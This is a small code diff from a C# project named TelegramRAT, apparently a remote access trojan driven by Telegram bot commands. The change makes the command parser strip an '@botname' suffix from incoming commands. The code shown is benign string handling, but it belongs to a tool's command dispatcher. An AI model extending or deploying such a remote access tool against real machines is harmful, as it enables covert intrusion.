@@ -25,8 +25,16 @@ namespace TelegramRAT
                 return null;
 
             string command = text.Split(' ')[0];
+            
+            
             string rawArgs = text.Substring(command.Length);
             string[] args = ParseArgs(rawArgs);
+
+            if (command.Contains('@'))
+            {
+                int index = command.IndexOf('@');
+                command = command.Substring(0, index);
+            }
 
             var botCommandModel = new BotCommandModel
             {
